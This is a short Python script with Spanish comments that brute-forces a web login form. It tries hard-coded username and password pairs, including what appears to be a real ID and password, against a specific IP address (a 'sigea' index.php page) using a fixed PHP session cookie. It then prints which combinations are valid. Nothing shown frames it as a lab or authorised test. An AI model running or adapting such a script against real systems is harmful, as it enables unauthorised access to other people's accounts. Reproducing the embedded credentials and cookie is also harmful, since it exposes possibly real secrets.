import sys
import requests
from termcolor import colored, cprint

# Cookie de autenticación (asegúrate de que esta cookie sea válida para tu entorno)
cookie = {
    "PHPSESSID": "q88d6p0330k5u5fs9ogbemc27a"
}

# Lista de usuarios y contraseñas directamente en el código
usuarios = ["20060001", "user1", "guest"]
contrasenas = ["Ivanna0709", "password", "admin123"]

# Bucle para probar combinaciones de usuario y contraseña
for usuario in usuarios:
    for contrasena in contrasenas:
        url = "http://35.222.177.84/sigea/index.php"
        data = {
            "login": usuario,
            "password": contrasena
        }

        # Realizamos la solicitud POST al sitio con las cookies de sesión
        response = requests.post(url, data=data, cookies=cookie)

        # Verificamos si la respuesta contiene el mensaje de error o éxito
        if "Username and/or password incorrect." not in response.text:
            cprint(f"[+] {usuario}:{contrasena} es válido", "green", attrs=["bold"], file=sys.stderr)
        else:
            cprint(f"[-] {usuario}:{contrasena} no es válido", "red", attrs=["bold"], file=sys.stderr)
